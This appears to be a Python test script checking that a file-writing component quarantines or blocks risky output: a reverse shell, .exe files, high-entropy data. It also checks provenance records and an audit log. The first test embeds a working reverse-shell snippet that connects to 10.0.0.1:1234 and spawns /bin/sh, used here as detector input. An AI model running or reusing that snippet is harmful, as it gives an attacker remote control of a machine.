
import asyncio
import os
import sys
import shutil
import json
from pathlib import Path

# Ensure project root is in path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from HoloLoom.fabric.materializer import Materializer
from HoloLoom.fabric.spacetime import Spacetime, Artifact, ArtifactType

async def main():
    print("==========================================")
    print("Frontier Safety Verification Suite")
    print("==========================================\n")
    
    # Setup
    test_dir = Path("frontier_test_output")
    if test_dir.exists():
        shutil.rmtree(test_dir)
    test_dir.mkdir(exist_ok=True)
    
    materializer = Materializer(root_dir=test_dir)
    print(f"Target Directory: {test_dir.resolve()}\n")

    # --- Test Cases ---

    # 1. Reverse Shell (Behavioral Risk)
    print("[1] Testing Reverse Shell Detection...")
    rev_shell_code = """
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
subprocess.call(["/bin/sh","-i"])
    """
    art_rev_shell = Artifact(
        name="payload.py", type=ArtifactType.CODE, content=rev_shell_code, destination_path="payload.py"
    )
    materializer.materialize(Spacetime("revshell", "payload", "hacker", 1.0, None, [art_rev_shell]))
    
    # Check if quarantined
    quarantine_dir = test_dir / ".quarantine"
    quarantined_files = list(quarantine_dir.glob("*payload.py")) if quarantine_dir.exists() else []
    if quarantined_files:
        print(f"SUCCESS: Reverse shell quarantined at {quarantined_files[0].name}")
    else:
        print("FAILURE: Reverse shell was NOT quarantined!")

    # 2. Blocked Extension
    print("\n[2] Testing Blocked Extension (.exe)...")
    exe_art = Artifact(name="malware.exe", type=ArtifactType.DATA, content="fake_binary", destination_path="malware.exe")
    materializer.materialize(Spacetime("exe", "exe", "hacker", 1.0, None, [exe_art]))
    
    if list(test_dir.glob("*.exe")):
        print("FAILURE: .exe file was written!")
    else:
        print("SUCCESS: .exe file was blocked.")

    # 3. High Entropy (Obfuscation)
    print("\n[3] Testing High Entropy Detection...")
    # Generate high entropy string
    import random
    high_entropy_content = "".join([chr(random.randint(0, 255)) for _ in range(1000)])
    # Need to encode carefully for the artifact content which expects str or bytes
    # Materializer handles bytes if type is DATA, let's pretend it's code to trigger text analysis or fail decode
    # Actually, let's use a safe high entropy text
    high_entropy_text = "A8zK9#mV!p2@Lq$5" * 100 # Repetition lowers entropy.
    # Let's use os.urandom and base64 to ensure it's "text" but high entropy
    import base64
    high_entropy_text = base64.b64encode(os.urandom(1000)).decode('utf-8')
    
    # Base64 is high entropy but "meaningful".
    # Real entropy check operates on bytes. Materializer converts str to bytes.
    # Compressed data has high entropy/byte.
    
    entropy_art = Artifact(name="packed.py", type=ArtifactType.CODE, content=high_entropy_text, destination_path="packed.py")
    # Note: Base64 itself has limited char set (64 chars), so entropy is ~6 bits/byte. 
    # Threshold is 7.5. To get >7.5 we need raw bytes.
    # But Artifact content is often a string. materializer encodes to utf-8.
    # Let's try to simulate a truly random byte string passed as content (allowed by type hint)
    
    raw_entropy_art = Artifact(name="random.bin", type=ArtifactType.DATA, content=os.urandom(1000), destination_path="random.bin")
    # .bin is blocked by extension. Let's use .dat
    raw_entropy_art.name = "data.dat"
    raw_entropy_art.destination_path = "data.dat"
    
    materializer.materialize(Spacetime("entropy", "entropy", "hacker", 1.0, None, [raw_entropy_art]))
    
    quarantined_entropy = list(quarantine_dir.glob("*data.dat")) if quarantine_dir.exists() else []
    if quarantined_entropy:
        print(f"SUCCESS: High entropy file quarantined at {quarantined_entropy[0].name}")
    else:
        print("FAILURE: High entropy file NOT quarantined (or entropy too low).")


    # 4. Safe Code (Provenance Check)
    print("\n[4] Testing Safe Code & Provenance...")
    safe_code = "print('Hello World')"
    safe_art = Artifact(name="hello.py", type=ArtifactType.CODE, content=safe_code, destination_path="hello.py")
    
    materializer.materialize(Spacetime("safe", "safe", "dev", 1.0, None, [safe_art]))
    
    if (test_dir / "hello.py").exists():
        print("SUCCESS: Safe file written.")
        if (test_dir / "hello.py.provenance").exists():
            print("SUCCESS: Provenance sidecar created.")
            with open(test_dir / "hello.py.provenance") as f:
                prov = json.load(f)
                print(f"  Provenance Risk Score: {prov['risk_assessment']['score']}")
        else:
            print("FAILURE: Provenance missing.")
    else:
        print("FAILURE: Safe file NOT written.")

    # 5. Audit Log Check
    print("\n[5] Checking Audit Log...")
    audit_file = test_dir / ".holo_audit.jsonl"
    if audit_file.exists():
        print(f"SUCCESS: Audit log found at {audit_file}")
        with open(audit_file) as f:
            for line in f:
                print(f"  LOG: {line.strip()}")
    else:
        print("FAILURE: Audit log missing.")

if __name__ == "__main__":
    asyncio.run(main())
